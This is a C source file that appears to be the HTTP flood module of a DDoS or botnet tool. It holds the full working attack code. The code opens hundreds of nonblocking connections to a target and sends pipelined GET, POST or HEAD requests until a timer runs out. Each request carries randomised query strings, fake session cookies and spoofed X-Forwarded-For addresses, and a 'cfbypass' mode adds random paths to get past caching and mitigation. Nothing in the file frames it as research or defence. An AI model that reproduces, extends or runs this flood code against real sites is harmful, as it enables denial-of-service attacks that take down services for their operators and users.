#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <ctype.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>

#include "http_method.h"
#include "http_common.h"
#include "../headers/protocol.h"
#include "../headers/attack_core.h"

#define MAX_CONNECTIONS 512
#define MAX_REQUEST_SIZE 4096
#define MAX_PIPELINE_DEPTH 10

static uint32_t fast_rand_seed = 123456789;
static inline uint32_t fast_rand(void) {
    fast_rand_seed ^= fast_rand_seed << 13;
    fast_rand_seed ^= fast_rand_seed >> 17;
    fast_rand_seed ^= fast_rand_seed << 5;
    return fast_rand_seed;
}

static inline void randomize_placeholders(char *buf, int *offsets, int count) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < count; i++) {
        int pos = offsets[i];
        if (buf[pos] == '*') {
            buf[pos] = charset[fast_rand() % 62];
        } else if (buf[pos] == '^') {
            buf[pos] = '0' + (fast_rand() % 10);
        }
    }
}

typedef struct {
    const char* method_str;
    const char* host;
    const char* path;
    const char* cookie;
    const char* referer;
    const char* post_data;
    int post_len;
    int randpath;
    int is_cfbypass;
} http_request_opts;

static int build_http_request(char* buf, size_t buf_size, const http_request_opts* opts, const char* user_agent) {
    int is_post = (strcmp(opts->method_str, "POST") == 0);

    /* Build path with optional random query string */
    char full_path[1024];
    if (opts->randpath && strchr(opts->path, '?') == NULL) {
        snprintf(full_path, sizeof(full_path), "%s?q=********", opts->path);
    } else {
        snprintf(full_path, sizeof(full_path), "%s", opts->path);
    }

    /* Optional headers */
    char extra_headers[1024] = "";
    int extra_off = 0;

    if (opts->cookie[0]) {
        extra_off += snprintf(extra_headers + extra_off, sizeof(extra_headers) - extra_off,
            "Cookie: %s\r\n", opts->cookie);
    } else {
        extra_off += snprintf(extra_headers + extra_off, sizeof(extra_headers) - extra_off,
            "Cookie: session=****************\r\n");
    }

    if (opts->referer[0]) {
        extra_off += snprintf(extra_headers + extra_off, sizeof(extra_headers) - extra_off,
            "Referer: %s\r\n", opts->referer);
    }
    
    if (is_post) {
        int body_len = (opts->post_data && opts->post_len > 0) ? opts->post_len : 11;
        extra_off += snprintf(extra_headers + extra_off, sizeof(extra_headers) - extra_off,
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %d\r\n", body_len);
    }

    int len = snprintf(buf, buf_size,
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "X-Forwarded-For: ^^^.^^^.^^^.^^^\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cache-Control: max-age=0\r\n"
        "%s"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: Upgrade, HTTP2-Settings\r\n"
        "Upgrade: h2c\r\n"
        "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
        "\r\n",
        opts->method_str, full_path, opts->host, user_agent, extra_headers);

    /* Append POST body */
    if (is_post && len < (int)buf_size - 1) {
        if (opts->post_data && opts->post_len > 0) {
            int space = (int)buf_size - len - 1;
            int copy = opts->post_len < space ? opts->post_len : space;
            memcpy(buf + len, opts->post_data, copy);
            len += copy;
        } else {
            int space = (int)buf_size - len - 1;
            int copy = 11 < space ? 11 : space;
            memcpy(buf + len, "data=random", copy);
            len += copy;
        }
        buf[len] = '\0';
    }

    if (len >= (int)buf_size) len = (int)buf_size - 1;
    return len;
}

typedef struct {
    int fd;
    uint8_t state;
    time_t created;
    int requests_sent;
} http_conn_t;

static void* http_flood(attack_params* params) {
    uint16_t max_conns = get_max_conns(params, MAX_CONNECTIONS);
    if (max_conns > MAX_CONNECTIONS) max_conns = MAX_CONNECTIONS;

    http_conn_t* conns = (http_conn_t*)calloc(max_conns, sizeof(http_conn_t));
    if (!conns) return NULL;

    struct pollfd* pfds = (struct pollfd*)malloc(max_conns * sizeof(struct pollfd));
    if (!pfds) { free(conns); return NULL; }

    struct sockaddr_in target;
    memcpy(&target, &params->target_addr, sizeof(target));

    attack_option* domain_opt = find_option(params, OPT_DOMAIN);
    attack_option* path_opt = find_option(params, OPT_PATH);
    attack_option* ua_opt = find_option(params, OPT_USERAGENT);
    attack_option* cookie_opt = find_option(params, OPT_COOKIE);
    attack_option* referer_opt = find_option(params, OPT_REFERER);
    attack_option* postdata_opt = find_option(params, OPT_POSTDATA);
    attack_option* keepalive_opt = find_option(params, OPT_KEEPALIVE);
    attack_option* pipeline_opt = find_option(params, OPT_PIPELINE);
    attack_option* uarand_opt = find_option(params, OPT_UARAND);
    attack_option* method_opt = find_option(params, OPT_METHOD);
    attack_option* randpath_opt = find_option(params, OPT_RANDPATH);

    uint8_t mode = get_attack_mode(params);
    int is_cfbypass = (mode == MODE_HTTP_CFBYPASS);

    /* Determine HTTP method */
    const char* method_str = "GET";
    if (method_opt && method_opt->data && method_opt->len > 0) {
        if (method_opt->len >= 4 && strncasecmp((char*)method_opt->data, "POST", 4) == 0) {
            method_str = "POST";
        } else if (method_opt->len >= 4 && strncasecmp((char*)method_opt->data, "HEAD", 4) == 0) {
            method_str = "HEAD";
        }
    }

    int randpath = randpath_opt ? get_option_u8(randpath_opt) : (is_cfbypass ? 1 : 0);

    char host[256];
    if (domain_opt && domain_opt->data && domain_opt->len > 0) {
        int len = domain_opt->len < 255 ? domain_opt->len : 255;
        memcpy(host, domain_opt->data, len);
        host[len] = '\0';
    } else {
        inet_ntop(AF_INET, &target.sin_addr, host, sizeof(host));
        host[sizeof(host) - 1] = '\0';
    }

    char path[512] = "/";
    if (path_opt && path_opt->data && path_opt->len > 0) {
        int len = path_opt->len < 511 ? path_opt->len : 511;
        memcpy(path, path_opt->data, len);
        path[len] = '\0';
    }

    char user_agent[512];
    int use_random_ua = uarand_opt ? get_option_u8(uarand_opt) : 1;
    if (ua_opt && ua_opt->data && ua_opt->len > 0) {
        int len = ua_opt->len < 511 ? ua_opt->len : 511;
        memcpy(user_agent, ua_opt->data, len);
        user_agent[len] = '\0';
        use_random_ua = 0;
    }

    char cookie[512] = "";
    if (cookie_opt && cookie_opt->data && cookie_opt->len > 0) {
        int len = cookie_opt->len < 511 ? cookie_opt->len : 511;
        memcpy(cookie, cookie_opt->data, len);
        cookie[len] = '\0';
    }

    char referer[512] = "";
    if (referer_opt && referer_opt->data && referer_opt->len > 0) {
        int len = referer_opt->len < 511 ? referer_opt->len : 511;
        memcpy(referer, referer_opt->data, len);
        referer[len] = '\0';
    }

    char post_data[1024] = "data=random";
    int post_len = 11;
    if (postdata_opt && postdata_opt->data && postdata_opt->len > 0) {
        post_len = postdata_opt->len < 1023 ? postdata_opt->len : 1023;
        memcpy(post_data, postdata_opt->data, post_len);
        post_data[post_len] = '\0';
    }

    http_request_opts req_opts = {
        .method_str = method_str,
        .host = host,
        .path = path,
        .cookie = cookie,
        .referer = referer,
        .post_data = post_data,
        .post_len = post_len,
        .randpath = randpath,
        .is_cfbypass = is_cfbypass,
    };

    int keepalive = keepalive_opt ? get_option_u8(keepalive_opt) : 1;
    int pipeline_depth = pipeline_opt ? get_option_u8(pipeline_opt) : 0;
    if (pipeline_depth > MAX_PIPELINE_DEPTH) pipeline_depth = MAX_PIPELINE_DEPTH;
    
    char* request = (char*)malloc(MAX_REQUEST_SIZE * MAX_PIPELINE_DEPTH);
    char* discard = (char*)malloc(4096);
    if (!request || !discard) {
        if (request) free(request);
        if (discard) free(discard);
        free(pfds);
        free(conns);
        return NULL;
    }
    
    int num_reqs = (pipeline_depth > 1) ? pipeline_depth : 1;
    int total_pipe_len = 0;
    const char* static_ua = use_random_ua ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/147.0.0.0 Safari/537.36" : user_agent;
    
    for (int p = 0; p < num_reqs; p++) {
        int single_len = build_http_request(request + total_pipe_len,
            (MAX_REQUEST_SIZE * MAX_PIPELINE_DEPTH) - total_pipe_len, &req_opts, static_ua);
        if (single_len <= 0) break;
        total_pipe_len += single_len;
    }
    
    int pipe_offsets[4096];
    int pipe_off_cnt = 0;
    for (int i = 0; i < total_pipe_len; i++) {
        if (request[i] == '*' || request[i] == '^') {
            pipe_offsets[pipe_off_cnt++] = i;
        }
    }
    
    time_t end_time = time(NULL) + params->duration;
    struct timeval last_cleanup = {0, 0};
    
    attack_rand_init();
    
    while (params->active && time(NULL) < end_time) {
        for (int i = 0; i < max_conns && params->active; i++) {
            if (conns[i].fd <= 0) {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0) continue;
                
                http_set_nonblocking(fd);
                
                int ret = connect(fd, (struct sockaddr*)&target, sizeof(target));
                if (ret < 0 && errno != EINPROGRESS) {
                    close(fd);
                    continue;
                }
                
                conns[i].fd = fd;
                conns[i].state = 1;
                conns[i].created = time(NULL);
                conns[i].requests_sent = 0;
            }
        }

        int nfds = 0;
        int poll_map[MAX_CONNECTIONS];
        for (int i = 0; i < max_conns; i++) {
            if (conns[i].fd > 0) {
                pfds[nfds].fd = conns[i].fd;
                pfds[nfds].events = POLLOUT;
                pfds[nfds].revents = 0;
                poll_map[nfds] = i;
                nfds++;
            }
        }

        if (nfds > 0) {
            poll(pfds, nfds, 5);
        }
        
        for (int j = 0; j < nfds && params->active; j++) {
            int i = poll_map[j];
            if (conns[i].fd <= 0) continue;

            if (pfds[j].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                close(conns[i].fd);
                conns[i].fd = 0;
                conns[i].state = 0;
                continue;
            }

            if (!(pfds[j].revents & POLLOUT)) continue;

            if (conns[i].state == 1) {
                int error = 0;
                socklen_t elen = sizeof(error);
                getsockopt(conns[i].fd, SOL_SOCKET, SO_ERROR, &error, &elen);
                if (error != 0) {
                    close(conns[i].fd);
                    conns[i].fd = 0;
                    conns[i].state = 0;
                    continue;
                }
                conns[i].state = 2;
            }

            if (j % 5 == 0) {
                randomize_placeholders(request, pipe_offsets, pipe_off_cnt);
            }

            if (total_pipe_len <= 0) continue;
            
            ssize_t sent = send(conns[i].fd, request, total_pipe_len, MSG_NOSIGNAL | MSG_DONTWAIT);
            
            if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                close(conns[i].fd);
                conns[i].fd = 0;
                conns[i].state = 0;
                continue;
            }
            
            if (sent > 0) {
                conns[i].requests_sent += num_reqs;
            }
            
            recv(conns[i].fd, discard, sizeof(discard), MSG_DONTWAIT);
            
            if (!keepalive || conns[i].requests_sent > 200) {
                close(conns[i].fd);
                conns[i].fd = 0;
                conns[i].state = 0;
            }
        }
        
        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec - last_cleanup.tv_sec >= 1) {
            for (int i = 0; i < max_conns; i++) {
                if (conns[i].fd <= 0) continue;
                
                time_t conn_age = time(NULL) - conns[i].created;
                if (conn_age > 10) {
                    close(conns[i].fd);
                    conns[i].fd = 0;
                    conns[i].state = 0;
                }
            }
            last_cleanup = now;
        }
    }
    
    for (int i = 0; i < max_conns; i++) {
        if (conns[i].fd > 0) {
            close(conns[i].fd);
        }
    }
    free(request);
    free(discard);
    free(pfds);
    free(conns);
    
    return NULL;
}

void* http_method(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;
    return http_flood(params);
}
